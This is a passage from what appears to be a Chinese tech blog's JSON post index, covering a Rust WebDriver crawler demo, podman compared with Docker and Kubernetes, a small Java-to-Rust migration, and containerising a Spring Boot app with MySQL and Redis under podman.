title:唐伯虎点秋香 - Flirting Scholar title:乱世佳人 - Gone with the Wind title:喜剧之王 - The King of Comedy title:楚门的世界 - The Truman Show title:狮子王 - The Lion King json title:霸王别姬 json title:这个杀手不太冷 json title:肖申克的救赎 json title:泰坦尼克号 json title:罗马假日 json title:唐伯虎点秋香 json title:乱世佳人 json title:喜剧之王 json title:楚门的世界 json title:狮子王 WebDriver 集成 一些网站由于反爬,构建 http 请求会遇到一些额外问题,那么使用 webdriver 将会是另外一种爬虫解决方案, 这里使用 thirtyfour 这个库\nCargo\n1 2 cargo add thirtyfour cargo add tokio 先运行 webdriver, 我这里使用 chromedriver , 默认监听 9515 端口\n示例代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 use thirtyfour::{prelude::*, error::WebDriverError}; use tokio; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(), WebDriverError\u0026gt;{ let url = \u0026#34;https://spa1.scrape.center/\u0026#34;; let caps = DesiredCapabilities::chrome(); let driver = WebDriver::new(\u0026#34;http://localhost:9515\u0026#34;, caps).await?; driver.get(url).await?; // 等待我们要的元素 let check = driver.query(By::Css(\u0026#34;.m-b-sm\u0026#34;)).first().await?; check.wait_until().displayed().await?; let els = driver.find_elements(By::Css(\u0026#34;.m-b-sm\u0026#34;)).await?; for el in els { println!(\u0026#34;el:{}\u0026#34;,el.inner_html().await?.as_str()); } driver.quit().await?; Ok(()) } 运行结果\n1 2 3 4 5 6 7 8 9 10 el:霸王别姬 - Farewell My Concubine el:这个杀手不太冷 - Léon el:肖申克的救赎 - The Shawshank Redemption el:泰坦尼克号 - Titanic el:罗马假日 - Roman Holiday el:唐伯虎点秋香 - Flirting Scholar el:乱世佳人 - Gone with the Wind el:喜剧之王 - The King of Comedy el:楚门的世界 - The Truman Show el:狮子王 - The Lion King 简单总结 支持爬虫操作的基础库基本都是涵盖的 相关的示例代码或者教程还是缺少 这次验证下来,还是可以满足我新系统设计的需求的,可以使用 rust 开发爬虫节点 ","date":"2022-05-06T00:38:25+08:00","image":"https://liangdi.me/p/simple-rust-crawler-technology-research/assets/rust-crawler_hu9902f331a47214e88fbddd7e7a10ce30_25175_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/simple-rust-crawler-technology-research/","title":"一次简单的 rust 爬虫开发技术调研"},{"content":"前言 大家好,我是 Liangdi, podman 4.x 版本已经发布了, 我也从 docker 开始向 podman 迁移, 所以是合适的时候写点 podman 的文章了.\npodman 是什么 官方网站: podman.io\n官方自己的介绍: https://podman.io/whatis.html\n名称 podman ,官方说明是 Pod Manager , 所以它不仅可以管理 OCI 容器,还可以管理 pod , 这也是和 docker 的最大差别吧.\n和 kubernetes 的区别 kubernetes(k8s) 是目前最流行的容器编排工具, 集群管理工具, 生态很完善, 也很\u0026quot;重\u0026quot;, pod 的概念就来自 k8s , 虽然 podman 也是管理 pod, 但是远远不及 k8s 的编排功能, 同时 podman 也没有集群管理功能,如果需要管理集群, 需要第三方工具完成.\n所以 podman 定位也不是编排和集群管理工具, 紧紧是一个 pod 和容器的管理工具. 所以不是一个级别的东西, 这里不做太多的比较.\n和 docker 的区别 如果仅仅从 docker 和 podman 两个命令提供的功能来讲,它们功能交集很大, podman 官方甚至推荐 alias docker=podman 来过渡.\ndocker 文档更齐全, podman 可以借用一下 docker 的文档 docker 生态更加完善, podman 一时半会赶不上,但是如果你只是去跑容器, 那这是一样的 docker 有 docker-compose, podman 早期没有对应工具,后面也出了 podman-compose, 但是这个功能是否必须? 值得考虑,因为 podman 支持 pod 管理. docker 有 machine , 让 windows 和 mac 支持 linux 容器, podman 也支持,而且已经比较完善. docker 有 docker-desktop , podman-desktop 目前还比较简单. docker 支持 rest api , podman 也支持 rest api, 这使得开发生态工具会比较简单. docker 有 swarm 支持集群部署, podman 没有对应工具, 不过支持 remote , 调用远程机器上的 podman service 执行对应的功能 , 这样能满足很多轻量化的场景. k8s 之前支持使用 docker-shim 和 docker 集成, 不过新版本也放弃这一层, 直接通过 CRI 调用 contained , podman 也不支持 CRI. 并且也没有什么计划. docker 商业/开源并行, podman 只有开源版本, 目前没有哪家公司提供商业支持(不清楚 redhat 有没有对应的服务,可能集成在订阅里面了). 为什么选 podman 上面讲了不少 docker 比 podman 有优势的方面, 这里开始讲 podman 的另外的东西, 这也是我选择 podman 主要原因.\n先罗列一下 podman 适合的场景\n没有很强的集群管理需求(或者说,已经有 overlay network 方案, podman 也是适用的) 仅仅为了容器化一些应用 团队内部轻量级使用,比如 ci/cd , 开发,测试环境等. 喜欢命令行或者脚本运维 感兴趣 podman 的生态建设(坑) 那么 podman 比 docker 好的方面有哪些呢?\n更加 rootless , 尽管 docker 也可以 rootless, 但是 podman 设计之初就开始支持 没有 daemon , 这使得 podman 在结合 namespace 和 cgroup 一起使用会更加灵活 pod , 和 k8s 基本一样的 pod , 一样支持 infra 容器. 这使得一些简单的容器编排 工作, podman 也可以简单实现. systemd service 集成, 由于没有 deamon , podman 通过 generate 子命令, 可以生成 systemd service 配置, 来管理容器和 pod 的作为服务启动. k8s 关联, podman 可以生成 kubectl 的 yaml 配置文件, 也通过 podman play kube 来运行 k8s 的配置, 也可以作为 k8s 的一个过渡吧, 而且 podman 也没有去实现 CRI 的计划, 这应该也是官方的态度, 不会参和到 k8s 生态中, 保持自己的轻量化工具的定位吧. remote , podman 通过 ssh 隧道或者 tcp 端口, 可以连接到远程机器上的 podman service, 从而实现远程机器上的容器和 pod 管理. 所以 podman 提供了一些轻量化而又灵活的功能特性,满足容器化,以及小批量服务器的场景.\n最后聊聊 podman 所在的 https://github.com/containers 组织 查看这个组织的仓库可以看到,他们真的是在做容器工具, 而且写了很多轮子, 包括 buildah 和 skopeo 这两个工具,与 podman 一起被称为下一代容器工具.\nrunc 是一个有名的 low-level OCI rumtime, 他们就开发了一个 crun . podman 早期版本使用 runc, 最新的版本已经使用 crun 了.\n众所周知, golang 是容器生态的主要语言, podman 也是 go 写的,但是在 podman 4 的版本中, podman 增加了非 CNI 的网络栈支持, 这几个工具是 netavark 和 aardvark-dns, 这两个工具是 rust 写的, 而且还有 youki 这个 rust 写的 low-level OCI runtime, 不知道将来某一天 podman 会不会默认使用 youki , 还有好几个 rust 写的容器技术相关的应用和库, 这是要与 golang 分天下的节奏.\n如果你也对 podman 以及其生态感兴趣, 关注我吧, 我会给你带来 podman 最新的动态以及实践方案.\n我的技术 Blog:https://liangdi.me\n","date":"2022-04-27T16:30:35+08:00","image":"https://liangdi.me/p/what-is-podman-and-different-from-kubernetes-and-docker/assets/podman-vs-docker_hub3205ed3c893c1f053112545244d1e4e_65326_120x120_fill_q75_box_smart1.jpg","permalink":"https://liangdi.me/p/what-is-podman-and-different-from-kubernetes-and-docker/","title":"选择 podman 的理由, 以及它和 Kubernetes , Docker 的区别"},{"content":"概述 使用 rust 也挺长时间了,但是一直是内部小打小闹,没有往客户那边推, 这次和客户商量好,拿一个很小的 java spring boot 项目开刀.\n这个项目小到 tiny 级别, 主要功能是: 请求一个服务, 对数据进行业务逻辑处理后, 使用 freemarker 渲染呈现给终端用户, rest api 也就 10 多个.\n迁移准备 首先,业务逻辑使用 rust 实现,肯定是没有大问题, 关键在于一些中间件和第三方库是否有替代,这样可以让运维或者交付更加平滑一点, 由于项目比较简单,第三方库也很通用,基本在 rust 这边也有对等的选择,所以本次迁移也将会简单很多.\n迁移说明 库和中间件迁移 库/中间件 Rust 版本 Java 版本 备注 Web Framework actix-web 4 Spring Boot 2.6.x http cleint reqwest jdk 11 HttpClient json serde_json gson template tera freemarker logging log4rs spring boot logging assets embedded rust-embed spring boot static 配置 dotenv spring boot 项目小, 配置需求不高, dotenv 够用 有没有坑? 由于项目实在不复杂, 过程中也没有遇到特别的问题, rust 的库也能正常工作, 从代码的角度很多时候比 java 简洁, 当然集成没有 spring boot 那么简单, 比如配置的自动读取赋值, 模板需要手动集成等等. spring boot 的 rest request 配置, 对应在 actix-web 中也是很简单,使用 #[get], #[post] 等宏实现, 请求内容的解构也一样完善, 迁移过程中没有遇到什么问题. 模板方面, tera 是 Jinja2/Django like 的所以,使用起来也没有什么障碍. 战胜 rust 编译器后,程序运行,完成测试没有遇到什么 bug ! 迁移后的变化 程序尺寸 spring boot jar 大小 20MB, 即使是 spring-native 打包也要 60 多 mb, 并且 spring-native 打包的程序没法正常运行,因为 spring-native 还没有 GA ,所以也没有去深究. rust 的程序使用 x86_64-unknown-linux-musl target release 静态编译打包(默认配置,无其他优化), 程序 strip 后是 9.3MB , 相比 jar 也小了一半, 还没考虑 jdk. 容器化, 这点 rust 的优势就体现出来了, 使用 FROM scratch 打包出来的镜像大小是 9.75MB , 相比 spring boot 项目, 基本的 openjdk:17-alpine 就有 320 多 MB 加上项目程序,也要 340 多 MB 了. 性能 肉眼可见的启动块了, 模板渲染也快了 程序瓶颈在于远程的服务,所以当前程序性能测试并不一定可靠,所以并没有去做特别的测试 后续迁移更多项目后,再进行一次性能测试比较 思考 如果项目不复杂, java 迁移到 rust 还是不算复杂的. 容器化的收益是不小的,不管是启动速度还是镜像大小. 后面考虑将微服务化的 java 项目选择合适的项目再进行 rust 迁移. ","date":"2022-04-26T11:06:35+08:00","image":"https://liangdi.me/p/a-tiny-app-migrate-from-java-to-rust/assets/java-rust_hu1a0eedb3cb55262de642044ece3234a1_193060_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/a-tiny-app-migrate-from-java-to-rust/","title":"记录一次 java 小项目的 rust 迁移过程"},{"content":"何为云原生 云原生一词可谓是大红大紫, 老板见面不说一下都觉得落伍了,技术人员更是要与时俱进,学习这一系列的新技术\n先看看 CNCF 对云原生的最新定义,注意云原生的定义一直是演进的,随着新技术,新架构的发展,定义也会变化.\n云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式API。\n这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。\n以上这两段话来自 CNCF 的云原生定义.\n简单的说就是用各种技术实现了大多数人梦寐以求的理想系统方案!\n但是,如果一个传统技术栈的团队,要向云原生迁移,代价会是多大呢? 这是个值得思考的问题.\nCNCF 有两个子站点 https://glossary.cncf.io/ 和 https://landscape.cncf.io/\n这两个站点可以大致了解云原生涉及到新概念以及生态图谱, 如此多的概念和繁杂的生态,对于传统技术团队来说将会带来额外的心智负担以及新的挑战.\n渐进式云原生 因此针对我们小团队以及小部门,我提出了渐进式云原生 和 轻量化云原生 的概念,以便云原生落地.\n渐进式云原生 是指自下往上,分阶段完成云原生迁移和落地. 这里大概会包含 容器化, 微服务化 , DevOps ,CI/DI 等方面向云端迁移, 而且不强调顺序, 实际的顺序大多数根团队的技术栈相关.\n所以这系列应该不会出现一来就叫你部署一套 k8s 集群, 可能到最后也不会,而是取决于你自己的选择.\n这一系列就是一次渐进式云原生的实践,废话一大推,我们进入正题\n使用 podman 容器化你的应用 第一篇是使用 podman 容器化你的应用 , 我认为容器化是迈向云原生过程中最简单的部分, 技术也成熟,风险不大. 这里为什么选择 podman ,详谈的话,需要再开一篇文章.\n实践目标 将一个传统的项目 CentOS -\u0026gt; Nginx -\u0026gt; (Spring Boot, MySQL, Redis) 容器化\n原项目是一个不算复杂的 Spring Boot 应用, 由于 Java 没法热更新, 所以使用 Nginx 反向代理了两套 Spring Boot 应用(两套应用可以同时运行也可以只运行一套), 关键时刻可实现用户无感知更新.\n两套 Spring Boot 应用监听不同端口, 使用 Systemd 作为系统服务配置, 上传新 jar 包后, 重启一个项目后, 再重启另外一个项目, 可以通过简单脚本实现.\n前端静态页面\n拓扑图如下: 实践过程 系统和 podman 的版本选择 原先部署在 CentOS 8 上, 这次容器化对 HOST 系统就没有特别的要求了, 所以选择了 Fedora Server, 三个原因: 一, 本人工作电脑使用 Fedora . 二, 容器技术依赖于 Linux 内核的 cgroup 和 namespace 技术,新内核会比老内核有优势, 虽然 Fedora 内核很新, 但是我相信 Linux 内核的稳定性. 三, CentOS 已经不再维护.\nPodman 我选择了最新的 4.0.x, 它和 3.x 版本不兼容功能, 但是使用上不会有差别, 主要是网络功能默认使用了 netavark 和 aardvark-dns ,没有使用 cni, 这两个工具是用 rust 编写的, 这也是我去尝试的主要原因之一\n容器使用选择 rootfull 还是 rootless , 我这里选择 root 运行, rootless 其实问题也不大,我测试除了没法 ping, 80/443端口等问题外, 还有一个不算特别大的问题就是, 容器创建好后无法再加入网络,需要创建的时候指定网络, root 情况下没问题.\n禁用 selinux 安装 podman fedora 中安装 podman 很简单\n1 2 sudo dnf copr enable rhcontainerbot/podman4 sudo dnf install podman 如果是安装 3.x 的版本, 还需要额外安装 podman-plugins 包,以实现 cni 网络的 dns 服务功能\n1 2 sudo dnf install podman sudo dnf install podman-plugins 在使用上版本 4 和版本 3 没有直接区别\n新的拓扑架构 还没有完全想好 nginx 这个前端代理以及前端静态页面是否要容器化,所以这里先保留之前的部署方案,拓扑图如下: 创建容器网络和基础容器 根据新的拓扑设计, Spring Boot 应用, MySQL , Redis 将会是以独立容器存在,所以需要创建一个网络将他们链接.\n1 2 3 4 5 6 # 创建名为 prod 的容器网络 podman network create prod # 查看网络 podman network ls # 之后创建或者运行容器的时候使用 --net prod 即可将容器加入到这个网络中 redis 容器\n使用以下命令创建 redis 容器\n1 podman run -d --name redis --net prod redis podman 支持多镜像服务器 , 所以如果不指定镜像服务器, 会让你选择, 一般选择 dokcer.io 的即可\n注意: 上面使用 \u0026ndash;net prod 将 redis 容器加入到网络中, 同时指定了名字 redis , 这样网络中的主机名会是 redis , 也可以使用 \u0026ndash;hostname 参数\n注意2: 上面的命令没有使用 -p 6379:6379 将 redis 端口暴露出来,因为我们的 Spring Boot 应用也会加入到 prod 网络中,内网是可以访问的,所以不需要暴露出来.\n可以使用以下命令测试 redis 容器\n1 2 3 4 podman exec -it redis redis-cli PING # 正常返回 PONG # 也可以进入容器 bash 测试 podman exec -it redis bash mysql 容器\n1 2 3 4 5 podman run \\ -e MYSQL_ROOT_PASSWORD=12345678 \\ --net prod \\ -v /opt/deploy/mysql/data:/var/lib/mysql \\ --name mysql -d mysql:8 -e MYSQL_ROOT_PASSWORD=12345678 指定了容器中 mysql root 用户的密码\n-v /opt/deploy/mysql/data:/var/lib/mysql 将 host 机器 /opt/\u0026hellip;./data 目录挂载到容器中 /var/lib/mysql 中, 这样 mysql 数据才能正常保存,如果缺少这个, 容器重启后, 数据将会被重置.\n更多配置查看 https://hub.docker.com/_/mysql\n创建 Spring Boot 容器 应用容器比较特殊,因为是内部应用, 也没法将应用发布到公共镜像上, 正常的流程是将应用打包,发布到私有镜像服务器中,再在 podman 中使用, 这里先跳过这一步,不然内容太多了!!!\n我这里创建了一个公共镜像 https://github.com/Liangdi/spring-boot-launcher\n这个镜像主要就是 jdk 环境,可以通过配置端口和 jar 名称,运行指定的 Spring Boot 项目\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 创建端口为 9090 的 Spring Boot 应用 PORT=9090 podman run -d --name sprin-boot-app-$PORT \\ -v /opt/deploy/app/:/deploy \\ -e APP_PORT=$PORT \\ --net prod \\ -p $PORT:$PORT \\ docker.io/liangdi/spring-boot-launcher # 创建端口为 9091 的 Spring Boot 应用 PORT=9091 podman run -d --name sprin-boot-app-$PORT \\ -v /opt/deploy/app/:/deploy \\ -e APP_PORT=$PORT \\ --net prod \\ -p $PORT:$PORT \\ docker.io/liangdi/spring-boot-launcher Spring Boot 应用容器化后,只需要将原先 mysql , redis 的链接配置修改一下即可, 原先是使用 127.0.0.1, 容器化后,改为容器主机名 mysql 和 redis 即可.\nNginx 反向代理和前端静态文件方面,没有去改动.\n到此, 此次 Spring Boot 应用基本容器化完成, 后续就是要将应用微服务化了. 伴随着渐进式云原生,可能在运维,测试,客户交付方面也会有所改变.\n创建 systemd 服务 使用 podman generate systemd 创建 sytemd service, 具体看文档 https://docs.podman.io/en/latest/markdown/podman-generate-systemd.1.html , 这里不再说明.\n容器化总结 基本的容器化,程序开发上不需要有改变, 只是简单修改 prod 的配置文件 运维人员工作流程基本没变 podman 基本兼容 docker 命令,所以有 docker 经验将很容易上手. 静态页面需不需要容器化,值的思考,如果是大流量应用, 静态页面肯定是 CDN , 如果是小应用, 那么多开一个容器多起一个静态服务器是否又是浪费? 我这次没有将静态页面容器化. 后续有新想法后再迭代 podman 中还有 pod 管理功能,这也是我选择 podman 的原因之一,这方面将会在下次容器有化中使用. 这次交付产物使用 -v 路径的方式告知容器,后续可以使用命名 volume 替代. ","date":"2022-04-23T16:59:14+08:00","permalink":"https://liangdi.me/p/progressive-cloud-native-with-podman/","title":"渐进式云原生实践: 使用 podman 容器化你的应用"}]